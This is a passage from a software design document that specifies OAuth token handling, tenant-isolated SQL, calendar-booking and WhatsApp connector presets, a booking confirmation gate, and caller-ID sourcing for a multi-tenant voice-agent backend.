- **Write rule:** on create, a client `enc:` value or `"[stored]"` gives 400 through the existing `ValueError` → 400 handler (the `validate_credentials` docstring in `telephony_configs.py` documents it). On update, the value is compared with the row read under `FOR UPDATE` in the same transaction, so a concurrent rotation cannot slip a stale ciphertext past the check (lesson 8). `"[stored]"` keeps that value, a byte-identical `enc:` round-trip keeps it, and any other `enc:` is rejected. New credentials therefore arrive only as plaintext (`api_key`, or a plaintext credentials field) and are sealed under the server's key. A ciphertext read from tenant A can no longer be stored on a tenant B row, because B's row never held it. Error text never contains the submitted value.
- **Why not tenant-bound `enc:t1.` here:** Conversation and vobiz decrypt Config refs with the shared `CompositeSecretResolver`, which this design makes refuse `enc:t1.` on purpose. Rebinding Config needs those readers to carry a tenant. That stays the tracked follow-up the finding names.
- **Mask rule:** `masked=True` for every principal that is not a platform service account, whatever its role, superadmin included. Masking is applied in the router, after the service call returns, so the Redis cache and the service-layer getters keep the sealed value for the service readers. The existing router guards are unchanged.
- **Every browser-facing route:** the masking test walks Config's `app.routes` mechanically and does not trust this list (lesson 29). Any route whose response carries one of these rows and is missing the wrap fails that test.

**Provider registry (`oauth.py`)**
```python
@dataclass(frozen=True)
class OAuthProvider:
    key: Literal["google", "zoho", "microsoft"]
    authorize_url: str            # browser-dialed only; never fetched by the backend
    token_url: str                # Zoho: formatted from the allow-listed accounts_server
    revoke_url: str | None        # Microsoft: None (no token-revoke endpoint)
    identity_scopes: frozenset[str]   # openid email (Google/MS); Zoho: AaaServer.profile.Read
    api_hosts: frozenset[str]     # the ONLY hosts this provider's token may be sent to
    accounts_servers: frozenset[str] = frozenset()   # Zoho DC origins

PROVIDERS: dict[str, OAuthProvider]
def configured_providers() -> list[str]
```
- **Google:** `api_hosts={"www.googleapis.com","sheets.googleapis.com"}`. Always sends `access_type=offline`, `prompt=consent` and `include_granted_scopes=true`, so every consent returns a refresh token and adds to the scopes already granted.
- **Microsoft:** uses `login.microsoftonline.com/common/oauth2/v2.0/*` with `api_hosts={"graph.microsoft.com"}`.
- **Zoho:** uses the fixed `accounts.zoho.{com,eu,in,com.au,jp,ca,sa,uk}` origin set, and `api_hosts` holds the matching `www.zohoapis.*`.
- Scopes always come from the registry and preset definitions and are never from tenant input:
  - Calendar booking: `calendar.events` + `calendar.freebusy`
  - Sheets: `drive.file`

**Service functions (`oauth.py`)**
```python
async def start_authorization(*, tenant_id: str, user_id: str, provider: str,
                              preset_key: str | None) -> str          # authorize URL
async def complete_authorization(*, tenant_id: str, user_id: str, user_email: str | None,
                                 state: str, code: str, accounts_server: str | None) -> dict
async def disconnect(*, tenant_id: str, connection_id: str,
                     user_id: str, user_email: str | None,
                     background: BackgroundTasks) -> dict            # {"disconnected": true}, always
async def list_connections(tenant_id: str) -> list[dict]             # explicit column list; no *_ref, no provider_sub
async def get_connected(conn, tenant_id: str, provider: str) -> dict | None
async def access_token_for(tenant_id: str, connection_id: str) -> tuple[str, OAuthProvider]
def _provider_transport(allowed_ips: list[str]) -> httpx.AsyncHTTPTransport   # test seam, as executor._step_transport
```

**Exact statements. Every read and every write carries `tenant_id = $1` (AC9, AC10, lesson 36):**

- **`start_authorization`:**
  - Deletes expired states: `DELETE FROM oauth_authorization_states WHERE tenant_id = $1 AND expires_at < now()`.
  - Generates `state = secrets.token_urlsafe(32)` and `verifier = secrets.token_urlsafe(64)`, with challenge `S256`.
  - Inserts `(tenant_id, user_id, provider, sha256(state), encrypt_tenant_secret(tenant_id, verifier), scopes, now() + interval '10 minutes')`.
  - `scopes` is the provider's identity scopes, plus the preset's scopes, plus the connection's existing `scopes`.
- **`complete_authorization`, redeem (one conditional statement, lesson 8):**
  ```sql
  UPDATE oauth_authorization_states SET consumed_at = now()
   WHERE tenant_id = $1 AND state_hash = $2 AND user_id = $3
     AND consumed_at IS NULL AND expires_at > now()
  RETURNING provider, code_verifier_ref, scopes
  ```
  - Zero rows (forged, replayed, expired, another user's, or another tenant's state) raises `ValueError("oauth_connection_failed")`. No token request is built (AC3).
  - A Zoho `accounts_server` outside `accounts_servers`, or a missing one, fails the same way.
  - The code exchange runs **after** that transaction commits. Network I/O never holds a transaction open, and a consumed state that failed the exchange cannot be reused, which is correct.
  - The PKCE verifier is read with `resolve_tenant_ref(tenant_id, code_verifier_ref)` and sent on the exchange, and the provider enforces it (AC4).
  - A response without a `refresh_token` fails with the same error.
  - `account_label` comes from the id_token's `email` claim (Google/MS). The id_token arrives directly from the provider's token endpoint over TLS, which OIDC Core §3.1.3.7 accepts in place of a signature check, and the value is used for display only. For Zoho it comes from the user-info endpoint.
  - `provider_sub` comes from the **same** response — the id_token's `sub` claim for Google and Microsoft, `ZUID` from Zoho's user-info — so finding 4's fix costs no extra provider call. A missing subject stores NULL rather than failing the connect; it only degrades the shared-grant check to "revoke anyway".
- **Upsert (single statement; reconnect reuses the same `id`, AC19):**
  ```sql
  INSERT INTO oauth_connections (tenant_id, provider, status, account_label, scopes, accounts_server,
                                 access_token_ref, access_expires_at, refresh_token_ref, connected_by,
                                 provider_sub)
  VALUES ($1, $2, 'connected', $3, $4, $5, $6, $7, $8, $9, $10)  -- $6, $8 = encrypt_tenant_secret($1, …)
  ON CONFLICT (tenant_id, provider) WHERE deleted_at IS NULL DO UPDATE SET
    status = 'connected', account_label = EXCLUDED.account_label, scopes = EXCLUDED.scopes,
    provider_sub = EXCLUDED.provider_sub,
    accounts_server = EXCLUDED.accounts_server, access_token_ref = EXCLUDED.access_token_ref,
    access_expires_at = EXCLUDED.access_expires_at, refresh_token_ref = EXCLUDED.refresh_token_ref,
    connected_by = EXCLUDED.connected_by, updated_at = now()
  RETURNING id, provider, status, account_label, scopes, created_at, updated_at
  ```
  Then `audit.write_audit(entity_type="oauth_connection", action="created"|"updated")`. Column names ending in `_ref` are already masked by `audit._redact` (`audit.py:35-42`).
- **`access_token_for`, read:**
  ```sql
  SELECT * FROM oauth_connections WHERE tenant_id = $1 AND id = $2 AND deleted_at IS NULL
  ```
  - No row, or a `status` other than `connected`, raises `ReconnectRequired`.
  - If `access_expires_at > now() + 60s`, it returns `resolve_tenant_ref(tenant_id, access_token_ref)`. There is no in-process cache, so a disconnect takes effect on the very next call (lesson 16).
- **Refresh (AC6, AC10).** The provider is called with the resolved refresh token, then:
  ```sql
  UPDATE oauth_connections
     SET access_token_ref = $4, access_expires_at = $5,
         refresh_token_ref = COALESCE($6, refresh_token_ref), updated_at = now()
   WHERE tenant_id = $1 AND id = $2 AND refresh_token_ref = $3 AND status = 'connected'
  RETURNING *
  ```
  - `$3` is the exact `enc:t1.` string that was read. Each one carries a random 96-bit nonce, so it is unique per encryption and works as a version token. `$4` and `$6` come from `encrypt_tenant_secret(tenant_id, …)`.
  - Zero rows means another refresh or a disconnect won. The function re-reads with the same predicate and uses the winner's token. If the re-read is not `connected`, it raises `ReconnectRequired`.
  - Google does not rotate refresh tokens, so both racers may match. Each write is one full-row statement, so the result is last-writer-wins between two valid tokens, never a torn write.
- **Refresh failure:**
  - A provider `400` with `error=invalid_grant`:
    ```sql
    UPDATE oauth_connections
       SET status = 'reconnect_needed', access_token_ref = NULL,
           refresh_token_ref = NULL, access_expires_at = NULL, updated_at = now()
     WHERE tenant_id = $1 AND id = $2 AND refresh_token_ref = $3 AND status = 'connected'
    ```
    Then raises `ReconnectRequired` (AC7). If a racer already rotated the token, this matches zero rows and the function re-reads as above.
  - Network errors and 5xx raise plain `ValueError`, which maps to `credential_unavailable`, and the status is unchanged.
- **`disconnect` (AC8):**
  ```sql
  UPDATE oauth_connections c SET status = 'disconnected', access_token_ref = NULL,
         refresh_token_ref = NULL, access_expires_at = NULL, updated_at = now()
    FROM (SELECT id, refresh_token_ref AS old_ref FROM oauth_connections
           WHERE tenant_id = $1 AND id = $2 AND deleted_at IS NULL FOR UPDATE) o
   WHERE c.id = o.id AND c.tenant_id = $1
  RETURNING o.old_ref
  ```
  - Zero rows raises `LookupError`, which `app.py` turns into a 404 with a fixed body. The body is identical for an absent id and for another tenant's id (lesson 2).
  - An already-disconnected own row returns `old_ref = NULL`, so the call succeeds with the same constant body; nothing is queued.
  - **Shared-grant check before the upstream revoke (round-4 finding 4).** After commit and before the revoke, on a `platform_conn(pool)` (`libs/tenancy`, the same helper `carriers.get_carrier_by_id` already uses for a deliberately cross-tenant read):
    ```sql
    SELECT EXISTS (SELECT 1 FROM oauth_connections
                    WHERE provider = $1 AND provider_sub = $2 AND status = 'connected'
                      AND deleted_at IS NULL AND tenant_id <> $3)
    ```
    `$2` is the **disconnecting row's own** `provider_sub`, read from the `FOR UPDATE` row in the statement above, never a request field (lesson 31); `$3` is the path tenant that already passed awaited `assert_tenant_access`. If it is true, the upstream revoke is skipped, and `log.info("oauth_revoke_skipped_shared_grant", extra={"connection_id": connection_id})` records why — no other tenant's id, slug or label is logged. A NULL `provider_sub` (a row connected before this change, or a provider that returned no subject) is treated as **not** shared, so the revoke still runs: for this control, failing closed means revoking, not leaving a grant alive.
  - **Why the response does not say the revoke was skipped.** The body is the constant `{"disconnected": true}` in every case, and the UI message is unchanged. A distinct `shared_grant` field would tell tenant A's admin that some other Yuviz tenant has the same provider account connected — a cross-tenant inference drawn from a response that varies with another tenant's state (lesson 2). The one principal who needs the detail is the platform operator, who has the log line.
  - After that, the function makes a best-effort `POST revoke_url` with the old refresh token and a 10s timeout, but only after the response has been sent, so neither the body nor the latency varies with another tenant's state. The DB is cleared first on purpose: a revoke failure must never leave a usable credential in our storage.
  - `audit action="updated"`.

**`auth_schemes.apply()` new branch.** It runs inside the existing `try`, after `except ReconnectRequired: raise`:
- Calls `token, provider = await oauth.access_token_for(api["tenant_id"], api["oauth_connection_id"])`.
- **Host binding:** if `urlsplit(api["endpoint_url"]).hostname` is not in `provider.api_hosts`, it raises `ValueError("credential_unavailable")` before the header is set.
- Otherwise it sets `headers["Authorization"] = f"Bearer {token}"` and returns `{"Authorization"}`, so the executor's existing exclusion keeps the token out of the arguments hash and step rows (`executor.py:815-832`).
- `api["tenant_id"]` is the DB row's own tenant, from `_build_api_tree`, and never a request field (lesson 31).

**Provider HTTP (token, revoke, user-info, and the Sheets create at apply time):**
- Each call runs `hostname, ips = await resolve_and_validate_endpoint(url)`.
- It then opens `httpx.AsyncClient(transport=_provider_transport(ips), timeout=10.0)` (AC12, lesson 18).
- Exceptions are re-raised as bare `ValueError("oauth_connection_failed")` or `ValueError("credential_unavailable")` with `from None`. The `ValueError` handler in `app.py` logs `str(exc)`, so no provider response body or request data can reach a log line (AC11).
- The authorization URL is only ever opened by the browser and is not SSRF-checked, because the backend never dials it.
- **Request encoding (finding 3).** The code exchange, refresh and revoke are all `client.post(url, data={...})`. `grant_type`, `client_id`, `client_secret`, `code`, `code_verifier`, `redirect_uri`, `refresh_token` and `token` are form fields only. `params=` is never passed, and the URL is the registry constant with no query string (for Zoho, the allow-listed `accounts_server` plus a fixed path). That holds for Zoho's refresh and revoke and for Google's revoke too, even though their docs show query strings. If a provider rejects the form body, the call fails closed (`oauth_connection_failed`, or a logged `oauth_revoke_failed` on disconnect) and is never retried with a query string. Test 10 confirms that the live endpoints accept it. User-info and Sheets calls send the access token only in the `Authorization` header.
- **Logging (finding 3).** `__main__.configure_logging()` sets `httpx` and `httpcore` to WARNING right after `basicConfig`. httpx's INFO `HTTP Request: <METHOD> <full URL>` line is the only place outbound URLs are logged today, so this one setting also keeps the executor's URLs, with their `event_id`, `spreadsheetId` and `sensitive` path values, out of logs. Toolexec's own log lines never include a URL. The only line this design adds, `booking_claim_release_failed`, carries just `custom_api_id`.

**Routes** (tenant-scoped routers carry `bind_path_tenant` and `require_path_tenant_access`, and every handler first awaits `await assert_tenant_access(tenant_id, current_user)`, lesson 38):

| Method and path | Dependency | Body → Response |
|---|---|---|
| `GET /oauth-providers` | `get_current_user` | → `[{"key","label"}]` (configured providers only) |
| `GET /tenants/{tenant_id}/oauth-connections` | `get_current_user` | → `[{id, provider, status, account_label, scopes, updated_at}]` |
| `POST /tenants/{tenant_id}/oauth-connections/{provider}/authorize` | `require_role("superadmin","admin")` | `{"preset_key": str \| null}` → `{"authorize_url"}` |
| `POST /tenants/{tenant_id}/oauth-connections/callback` | `require_role("superadmin","admin")` | `{"state","code","accounts_server"?}` → connection (as in GET) |
| `DELETE /tenants/{tenant_id}/oauth-connections/{connection_id}` | `require_role("superadmin","admin")` | → `{"disconnected": true}` (always; the revoke runs after the response) |
| `GET /connector-presets` | `get_current_user` | → static list: `key, title, provider, setup fields + defaults` |
| `POST /tenants/{tenant_id}/connector-presets/{preset_key}/apply` | `require_role("superadmin","admin")` | `PresetApplyRequest` → `[custom_api]` (201) |
| `DELETE /tenants/{tenant_id}/connector-presets/{preset_key}` | `require_role("superadmin","admin")` | → 204 |

- The callback's `user_id` predicate, the current-JWT role check and `assert_tenant_access` together re-validate the granting context at redemption (lesson 16). A user demoted after starting the flow fails `require_role`. Another admin in the same tenant cannot redeem someone else's state.
- Every callback failure returns the same `400 {"detail":"oauth_connection_failed"}`, and the UI shows "Connection failed, please try again."
- Every custom-API dict that a route returns, from the existing `routers/custom_apis.py` routes and from preset apply, passes through `public_custom_api`, so no `*_ref` value reaches any role (finding 1).

**`presets.apply_preset(*, tenant_id, preset_key, setup, user_id, user_email) -> list[dict]`**
1. Pre-transaction checks:
   - Every step's `endpoint_url` goes through `resolve_and_validate_endpoint` (AC20).
   - OAuth presets get `get_connected(conn, tenant_id, provider)` with `WHERE tenant_id = $1 AND provider = $2 AND deleted_at IS NULL AND status = 'connected'`. If that returns nothing, the call raises `PresetConnectorRequired`, which becomes 409 `connector_required` (AC15). The UI then starts authorize with this `preset_key` and re-applies after the callback.
   - Required scopes missing from `scopes` also give 409 `connector_scope_required`, handled the same way. `PresetConnectorRequired` gets its own handler in `app.py`, next to `DependentApiExists`.
2. For WhatsApp: `key_ref = encrypt_tenant_secret(tenant_id, setup.api_key.get_secret_value())`, run through `_validate_credential_ref`. That ref is bound to this tenant, so copying it into another tenant's row fails both registration and call-time decryption. For Interakt, the plaintext is `"Basic " + key`, sent with `api_key` scheme and `name="Authorization"`. The raw key is never logged, never audited and never returned.
3. For Sheets: one provider call creates the spreadsheet (`POST sheets.googleapis.com/v4/spreadsheets`, `drive.file` scope) and appends a header row. The `spreadsheetId` becomes a literal path param.
4. `tenant_conn` then `transaction()` then `pg_advisory_xact_lock(hashtext('custom_apis:' || tenant_id))`, the same lock as `custom_apis.py:508`:
   - `SELECT id, name FROM custom_apis WHERE tenant_id = $1 AND preset_key = $2 AND deleted_at IS NULL`.
   - For each step not already present by name, in dependency order, `_insert_custom_api(conn, …, oauth_connection_id=…, preset_key=…, response_transform=…, idempotency_body_field=…)`, resolving `upstream_api_id` through the step-name-to-id map.
   - `_recompute_tenant_chain_levels(conn, tenant_id)` runs once.
   - `asyncpg.UniqueViolationError` on name raises `ValueError("preset_name_conflict: <name>")`.
   - Re-applying a complete preset is a no-op that returns the existing rows (AC19). A provider failure in step 3 raises before the transaction, so no partial chain is left (AC26).

**`presets.remove_preset(*, tenant_id, preset_key, user_id, user_email) -> None`** runs under the same lock:
- Raises `DependentApiExists` if any live row **without** this `preset_key` has an upstream param pointing into the set.
- Otherwise runs `UPDATE custom_apis SET deleted_at = now() WHERE tenant_id = $1 AND preset_key = $2 AND deleted_at IS NULL`, and writes one audit row per id.

**Confirmation gate (AC22)** (`executor.py`, runs only for rows with `confirmation_template`):
```python
class _ConfirmationRequired(Exception):
    def __init__(self, read_back: str) -> None: ...

async def _confirmed_in_prior_turn(tenant_id: str, session_id: str, custom_api_id: str,
                                   arguments_hash: str, turn_id: str) -> bool
def presets.render_confirmation(template: str, arguments_redacted: dict,
                                upstream_responses: dict[str, dict]) -> str   # ValueError if unrenderable
```
```sql
SELECT 1 FROM api_chain_steps s
  JOIN api_chain_runs r ON r.id = s.run_id
 WHERE r.tenant_id = $1 AND r.session_id = $2 AND s.custom_api_id = $3
   AND s.arguments_hash = $4 AND s.status = 'confirmation_required'
   AND r.turn_id <> $5 AND s.created_at > now() - interval '10 minutes'
   AND NOT EXISTS (SELECT 1 FROM api_chain_steps d
                     JOIN api_chain_runs dr ON dr.id = d.run_id
                    WHERE dr.tenant_id = $1 AND dr.session_id = $2 AND d.custom_api_id = $3
                      AND d.arguments_hash = $4 AND d.status = 'success'
                      AND d.created_at > s.created_at)
 LIMIT 1
```
- `tenant_id` is the UUID from `_resolve_tenant_uuid`, and the query carries the explicit predicate (lesson 36). The lookup uses the existing `idx_api_chain_runs_tenant_session` and `idx_api_chain_steps_run` indexes, so no new index is needed.
- **No match (first call):** no upstream request, no side-effect claim, no idempotency key sent. The step is persisted with `status='confirmation_required'` and the same `arguments_hash`. The run is finalized as `confirmation_required`, and the response has `deterministic_response=<read-back>`, `data={}` and `error="confirmation_required"`.
- **Match (a later turn, identical arguments):** the existing claim-and-dispatch path runs unchanged. A later identical call is deduped by the existing side-effect claim. The `NOT EXISTS` clause makes each pending row good for one dispatch: once a booking succeeds after it, it no longer matches. Without that, a same-session book, cancel, then rebook of the identical slot (now possible, see "Booking-claim release") would dispatch on the original read-back with no new one.
- **Changed arguments** (a different time, name or event) produce a different hash, so the model gets a fresh read-back. Asking again in the **same** turn (the model looping inside one turn) never matches, because of `r.turn_id <> $5`, and the orchestrator ends the turn after the read-back anyway.
- **Why the arguments hash is the right key:** it is `_derive("claim", …)` over `resolved_arguments`, which after Changes (g) covers exactly the declared arguments: body, query, header **and path** values, so the upstream-resolved `event_id` for reschedule and cancel is included. Without (g), `gcal_cancel` would hash to the constant `{}`, and every cancel after the first would be refused by its own side-effect claim. It excludes auth headers (`executor.py:827-832`) and is computed before the idempotency `id` is placed (see Changes (c)). So what gets dispatched is byte-for-byte what was read back.
- **`render_confirmation`** reads only from `{**arguments_redacted, "upstream": upstream_responses}`. `arguments_redacted` is the same projection persisted to the step. `upstream_responses` holds the post-transform responses of this row's upstream steps in the same run, keyed by API name; for cancel and reschedule this is `gcal_find_booking`'s `google_booking_lookup` projection, which has no PII. It uses `graph.extract` placeholders like `_interpolate_success_template`. A test over `PRESETS` asserts that no preset param is named `upstream`. Any value that parses as an ISO-8601 datetime is spoken in its own UTC offset as "Thursday 1 October at 10 AM", so the read-back states the exact instant that will be booked, with no timezone config. A missing or `[redacted]` placeholder raises, which becomes `_StepFailure("failed", "confirmation_unrenderable")`, so the row never dispatches. The template is authored only by `presets.py` and is not exposed on `CustomApiCreate`/`CustomApiUpdate`.
- **Latency:** the gate adds one indexed `SELECT` only on gated rows. The first call skips the upstream HTTP round-trip entirely, so it is faster than today's path. It is never on the audio or LLM streaming path.

**Booking-claim release** (`executor.py` and `presets.py`; runs only on a 2xx from a row whose preset step declares `releases_claim_of`, which is `gcal_cancel` only):
```python
def presets.claim_release_target(api_row: dict) -> str | None   # PRESETS[preset_key] step named api_row["name"] -> its releases_claim_of, else None
async def _release_booking_claim(tenant_id: str, preset_key: str, target_api_name: str,
                                 event_id: str) -> bool          # True if a claim row was released
```
```sql
DELETE FROM api_side_effect_claims c
 USING custom_apis b
 WHERE c.tenant_id = $1 AND c.id = $2 AND c.status = 'success'
   AND b.tenant_id = $1 AND b.id = c.custom_api_id
   AND b.preset_key = $3 AND b.name = $4
RETURNING c.id
```
- **How the matching claim is identified:** `gcal_book` writes its claim row's `id` into the Google event `id` (Changes (c)), and `gcal_cancel`'s `event_id` comes from `gcal_find_booking` (`$.items[0].id`). So `$2 = uuid.UUID(hex=event_id)` is the exact claim that created the event being cancelled. `$3`/`$4` (the cancel row's `preset_key` and the declared target `gcal_book`) pin it to that tenant's booking row. An `event_id` that does not parse as a UUID (an event the tenant made by hand in Google) raises `ValueError` in Python, which is caught before any SQL and releases nothing.
- **Tenant scope:** both `c.tenant_id = $1` and `b.tenant_id = $1` are explicit predicates, with `tenant_id` the UUID from `_resolve_tenant_uuid`, run on `tenant_conn` like `_release_side_effect_claim` (`executor.py:617-629`). RLS is the second layer, not the only one (lesson 36).
- **Why `DELETE`, not `status='released'`:** `_claim_side_effect`'s `ON CONFLICT ... DO UPDATE` keeps the row's `id`, so a `'released'` row would hand the rebook the cancelled event's `id`, and Google would 409 it. Deleting makes the rebook's plain `INSERT` mint a fresh `id`, so the rebook gets a fresh event `id`. Nothing references `api_side_effect_claims.id`; the step history lives in `api_chain_steps` and is untouched. The TTL reclaim (`:609-610`) and the non-409-4xx release (`:617`) still go through `DO UPDATE`, so they keep the `id` and keep Google's 409 as the backstop for a timed-out booking that actually landed.
- **Only a `'success'` claim is released.** A `'claimed'` or `'timeout'` claim (a booking still in flight, or one whose outcome is unknown) stays put and fails closed.
- **A failed cancel releases nothing:** the call sits after the `200 <= status_code < 300` check at `:870-871`. Every other outcome raises `_StepFailure` before it: a non-2xx (including Google's 404/410 for an already-deleted event), a timeout (`:851`), a truncated response (`:856`), the cancel's own claim being lost (`:839`), `reconnect_required`, and the first, unconfirmed call (`_ConfirmationRequired` is raised before any claim or dispatch).

**Caller-ID param source (finding 2)**
```python
def presets.normalize_ani(raw: str) -> str | None   # "+" + digits, if 8-15 digits after dropping non-digits; else None
def presets.remote_party_number(call_direction: str, caller_number: str, called_number: str) -> str | None
async def executor._remote_party(tenant_id: uuid.UUID, request: ChainExecuteRequest) -> str | None
```
- **`remote_party_number`** is a pure function. When `call_direction == "inbound"`, the candidate is `normalize_ani(caller_number)`. When it is `"outbound"`, the candidate is `normalize_ani(called_number)`. Any other value returns `None`, including `""` (missing), `"test"` (webcall, `services/webcall/__main__.py:276`) and every unknown string. It also returns `None` when the candidate is `None`, or when `normalize_ani` of the other leg is equal to it (ambiguous). Direction and number are separate inputs, so "no direction" and "no number" are separate causes, and both fail closed (lesson 39).
- **`_remote_party`** returns `remote_party_number(request.call_direction, request.caller_number, request.called_number)`. It returns `None` when that is `None`, or when the result is one of this tenant's own DIDs: `SELECT 1 FROM phone_numbers WHERE tenant_id = $1 AND '+' || regexp_replace(did, '\D', '', 'g') = $2 LIMIT 1`, with an explicit tenant predicate (lesson 36). This is how an outbound leg mislabelled `inbound` fails closed: its `caller_number` is the tenant's campaign DID. The query runs on `tenant_conn` with the UUID from `_resolve_tenant_uuid`. It only runs for chains that touch a `caller_id` param or the lookup transform, and they hit it once.
- **Where the three fields come from:** `ChainExecuteRequest.caller_number`, `called_number` and `call_direction` are set by Conversation from `request.context`. That context holds `ctx.caller_did`, `ctx.called_did` and `ctx.direction` (`__main__.py:378-381`). Telephony stamps those values from the route (`orchestrator.py:196-216`): `direction="outbound"` with `called_did=call.to_number` for a call this service placed, and the inbound route otherwise. `/execute` accepts only named service accounts (`routers/execute.py:35-46`), so no tenant or caller can set any of the three. The LLM's tool arguments arrive in `caller_arguments`, which is never read for a `caller_id` param (Changes, executor (i)).
- `caller_id` params never reach the model's tool schema, because `policy_resolver` builds that schema only from `source = 'caller'` params (`policy_resolver.py:255`).
- Book and find use the same `remote_party` from the same source, so the stored value and the lookup value always match byte for byte. E.164 correctness is not what the match depends on.
- With no usable remote party (browser test calls, withheld caller ID, missing or unknown direction, an outbound call with no callee number, or a number that is the tenant's own DID), every step that has a `caller_id` param fails with `invalid_argument`/`caller_id_unavailable` and makes zero upstream requests: book, find, and therefore reschedule and cancel.
- `value_digits_only` only strips the leading `+` from the already-normalized `+<digits>` value; it never reshapes it, so a `caller_id` param cannot become a different number than the one `_remote_party` returned.
- Every `caller_id` param on the preset rows has `sensitive=true`. It still feeds `arguments_hash`, which keeps claims and confirmations per caller, but it shows as `[redacted]` in `arguments_redacted`, and no read-back template references it.

**Calendar preset rows** (all `auth_scheme='oauth2_authorization_code'`; `calendar_id` comes from setup and defaults to `primary`):

| name | method and endpoint | chaining | notes |
|---|---|---|---|
| `gcal_check_slots` | `POST https://www.googleapis.com/calendar/v3/freeBusy` | leaf | Caller params: `time_min` and `time_max` (ISO, `body_path` `timeMin`/`timeMax`). Literal `items.0.id`. `side_effecting=false`. `response_transform={"kind":"google_freebusy_slots","timezone","day_start","day_end","slot_minutes"}`. Template: `Available times: {{$.spoken_slots}}.` |
| `gcal_book` | `POST …/calendars/{calendar_id}/events` | leaf | Caller params: `patient_name`, `service`, `start_time` and `end_time` (`body_path` `start.dateTime`/`end.dateTime`). `patient_name` → `summary`. `service` → `extendedProperties.private.service`; it is described to the model as "the doctor or service" (AC22's "doctor/service"). The `caller_id` param `caller_phone` (`sensitive`) → `extendedProperties.private.yuviz_phone`, and the literal `extendedProperties.private.yuviz_preset = "calendar_booking"`. The phone appears nowhere else on the event (not in `description`). `idempotency_body_field='id'` (value: the claim id hex). `confirmation_template`: `To confirm: {{$.summary}}, {{$.extendedProperties.private.service}}, on {{$.start.dateTime}}. Shall I book it?` Template: `Booked {{$.summary}} for {{$.start.dateTime}}.` |
| `gcal_find_booking` | `GET …/calendars/{calendar_id}/events` | leaf | Caller param: `timeMin`. The `caller_id` param `privateExtendedProperty` (`sensitive`, `value_prefix='yuviz_phone='`) makes Google filter server-side on exact equality. **There is no `q` param.** Literals: `singleEvents=true`, `orderBy=startTime`, `maxResults=5`. `side_effecting=false`. `response_transform={"kind":"google_booking_lookup"}`. |
| `gcal_reschedule` | `PATCH …/events/{event_id}` | `event_id` ← `gcal_find_booking` `$.items[0].id` | Caller params: `start_time` and `end_time`. `confirmation_template`: `To confirm, move your {{$.upstream.gcal_find_booking.items.0.service}} appointment on {{$.upstream.gcal_find_booking.items.0.start}} to {{$.start.dateTime}}?` `response_transform={"kind":"google_event_projection"}`. |
| `gcal_cancel` | `DELETE …/events/{event_id}` | `event_id` ← `gcal_find_booking` `$.items[0].id` | `confirmation_template`: `To confirm, cancel your {{$.upstream.gcal_find_booking.items.0.service}} appointment on {{$.upstream.gcal_find_booking.items.0.start}}?` `releases_claim_of='gcal_book'` (static preset field, not a column). |

- The maximum chain depth is 2, well under `graph.MAX_CHAIN_LEVELS=4`.
- `apply_response_transform("google_freebusy_slots", response, body_fields)` subtracts `calendars[*].busy` from `[timeMin, timeMax] ∩ [day_start, day_end]` in the given timezone. It returns `{"slots":[{"start","end","spoken"}] (≤3), "slot_count":n, "spoken_slots":"10 AM, 11:30 AM, or 2 PM" | "none in that window"}` (AC21).
- `apply_response_transform("google_booking_lookup", response, body_fields, caller_ani=…)` keeps an item only if all of these hold, and keeps at most the earliest one:
  - `status != "cancelled"`.
  - `extendedProperties.private.yuviz_preset == "calendar_booking"`.
  - `extendedProperties.private.yuviz_phone == caller_ani`.
  - `id` parses as a UUID hex, meaning a claim id written by `gcal_book` (Changes (c)).

  It returns `{"items": [{"id", "start", "end", "service"}], "match_count": n}`, with `start` and `end` flattened to their `dateTime` strings. `caller_ani=None` gives `{"items": [], "match_count": 0}`. This is a second, independent layer under Google's `privateExtendedProperty` filter. It also drops `summary` (the patient name), `description`, `attendees`, `creator`/`organizer`, `htmlLink` and the stored phone before `redaction.redact`, so none of them reach `response_redacted` or `prior_responses`. No match leaves `$.items[0].id` unresolved, so cancel and reschedule stop in `_resolve_arguments`' existing missing-upstream-value branch. Nothing is dispatched, and the model tells the caller that no booking was found under this number.
- `apply_response_transform("google_event_projection", …)` projects the PATCH response to `{"id", "start", "end", "service"}` in the same way.
- `validate_response_transform` rejects any other `kind` or any extra keys. The transform is written only by `presets.py`, because the raw create schema does not expose it.

**WhatsApp rows** (one row each, `name='whatsapp_send_confirmation'`, `preset_key='whatsapp_confirmation'`; all `side_effecting=true`, `session_send_cap=3`):

| Provider | Endpoint and auth | Body | Recipient param (`source='caller_id'`, `sensitive=true`) |
|---|---|---|---|
| Gupshup | `POST https://api.gupshup.io/wa/api/v1/template/msg`, `body_style='form'`, `api_key` in header `apikey` | Builds `template.id` and `template.params.N` through `body_path`. The form rule JSON-encodes the `template` field. | `destination`, `value_digits_only=true` (Gupshup's `destination` is bare digits) |
| Interakt | `POST https://api.interakt.ai/v1/public/message/`, `api_key` with `Authorization: Basic …` | `template.bodyValues.N` | `fullPhoneNumber` (E.164 with the `+`), not the split `countryCode`/`phoneNumber` pair, because a `caller_id` resolves to one value and splitting it would need a second transform |
| Meta Cloud API | `POST https://graph.facebook.com/v20.0/{phone_number_id}/messages`, `bearer` | `template.components.0.parameters.N.text` | `to`, `value_digits_only=true` (Graph rejects the `+`) |

**The recipient is server-chosen (round-4 finding 3).** It was a caller/model argument through round 3, which let an anonymous caller make the agent text arbitrary numbers at the tenant's expense, with a different `arguments_hash` each time so the side-effect claim never deduped. Now:
- The recipient param's `source='caller_id'`, so its value comes from `executor._remote_party` — `remote_party_number(call_direction, caller_number, called_number)` on server-stamped call metadata, which gives the caller on inbound and the callee on outbound (lesson 44). `caller_arguments[name]` is never read for such a param (Changes, executor (i)), and the field never reaches the model's tool schema, because `policy_resolver` builds that schema only from `source='caller'` params (`policy_resolver.py:255`). There is no argument the model can pass that changes who receives the message.
- No usable remote party (webcall, withheld ANI, unknown direction, ambiguous legs, or the tenant's own DID) fails with `invalid_argument`/`caller_id_unavailable` and makes **zero** upstream requests, exactly as the calendar rows do.
- The confirmation therefore always goes to the party on the call. The tenant can no longer be used as an open relay, and a hostile caller can only text themselves.

**Per-session send cap: 3 (round-4 finding 3).**
- **Where:** `executor.py`, immediately after the confirmation gate (Changes (f)) and **before** `_claim_side_effect` at `:837`, so a refusal takes no claim and makes no upstream request. It runs only when `api_row["session_send_cap"]` is not NULL, which is only the WhatsApp preset rows; every existing row is NULL and unaffected.
- **The count** runs on `tenant_conn` with the UUID from `_resolve_tenant_uuid`, with an explicit tenant predicate rather than relying on RLS (lesson 36):
  ```sql
  SELECT count(*) FROM api_chain_steps s
    JOIN api_chain_runs r ON r.id = s.run_id
   WHERE r.tenant_id = $1 AND s.custom_api_id = $2 AND s.session_id = $3 AND s.status = 'success'
  ```
